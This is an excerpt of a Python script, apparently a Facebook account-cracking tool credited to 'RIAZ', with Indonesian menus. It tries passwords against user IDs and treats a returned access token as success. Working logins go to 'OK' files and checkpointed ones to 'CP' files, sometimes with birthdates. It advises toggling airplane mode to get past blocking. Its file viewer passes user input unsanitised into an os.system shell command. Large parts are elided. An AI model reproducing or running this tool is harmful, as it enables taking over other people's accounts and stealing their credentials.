...
'########::'####::::'###::::'########:
 ...
 ##:::. ##:'####: ##:::: ##: ########:
..:::::..::....::..:::::..::........::
\033[94;1m╔[ \033[97;1mRecode   \033[97;1m: \033[91;1mRIAZ\x1b[1;95mcybear\x1b[1;91mRIAZ
\033[94;1m╠[ \033[92;1mWhatsApp \033[97;1m: \033[93;1m+923188214452
\033[94;1m╠[ \033[97;1mGithub   \033[97;1m: \033[93;1mhttps://github.com/RIAZKILLER
\033[94;1m╠[ \033[91;1mYOUTUBE  \033[97;1m: \033[93;1mhttps://youtube.com/channel/UCPOWtzNan9ff-E0RI66Wu2A
\033[94;1m║\033[97;1m─────────────────────────────────────────────────────────────
...
def menu():
	...
	print(s+">"+m+"7"+s+"."+l+" Lihat opsi RIAZ Crack "+s+"{ok/cp}")
...
def result():
	...
	if pilih=="1" or pilih=="01":
		...
		if len(lisaa)==0:
			print("\n"+balmond+k+" RIAZ CP")
			print(balmond+m+" Tidak Ada RIAZ Cp")
			...
			try:
				binatang = open("RIAZ_Cp/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd RIAZ_Cp && cat %s"%(marjan))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="2" or pilih=="02":
		try:
			lisaa = os.listdir("RIAZ_Ok")
		except FileNotFoundError:
			jalan(balmond+m+" Direktori Tidak Ditemukan")
			time.sleep(0.5)
			menu()
		if len(lisaa)==0:
			print("\n"+balmond+l+" RIAZ Ok")
			print(balmond+m+" Tidak Ada RIAZ Ok")
			input(balmond+l+" Kembali")
			time.sleep(0.5)
			menu()
		else:
			...
			marjan = input(balmond+l+" File : "+h+"")
			try:
				binatang = open("RIAZ_Ok/%s"%(marjan))
			except IOError:
				jalan(balmond+l+" Nama File Tidak Ada")
				time.sleep(0.5)
				menu()
		print(""+l)
		bilur = os.system("cd RIAZ_Ok && cat %s"%(marjan))
		input("\n"+balmond+l+" Kembali")
		time.sleep(0.5)
		menu()
	elif pilih=="0" or pilih=="00":
...
def mode_crack():
	...
	if pilih=="1" or pilih=="01":
		...
		print(balmond+l+" Jika Tidak Ada RIAZ, Hidupkan Mode Pesawat 5 Detik\n")
		default()
	elif pilih=="2" or pilih=="02":
		...
		try:
			...
			if 'access_token' in response.text and 'EAAA' in response.text:
				if "old" in old_gak:
					...
					bts = open("RIAZ_Ok/OK_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
					ok.append(uid+"|"+pw)
				else:
					...
					try:
						...
						if len(lahir)==2:
							...
							if "old" in old_gak:
								...
								bts = open("RIAZ_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
							...
							if "old" in old_gak:
								...
								bts = open("RIAZ_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+">"+lahir[1]+" "+nama_bulan+" "+lahir[2]+"\n");bts.close()
								cp.append(uid+"|"+pw)
							else:
						...
						if "old" in old_gak:
							...
							bts = open("RIAZ_Cp/CP_%s.txt"%(hck),"a");bts.write(uid+">"+pw+"\n");bts.close()
							cp.append(uid+"|"+pw)
						else:
...
def cek_opsi():
	...
	print(balmond+l+" Contoh : "+k+"RIAZ_Cp/CP_%s.txt"%(hck))
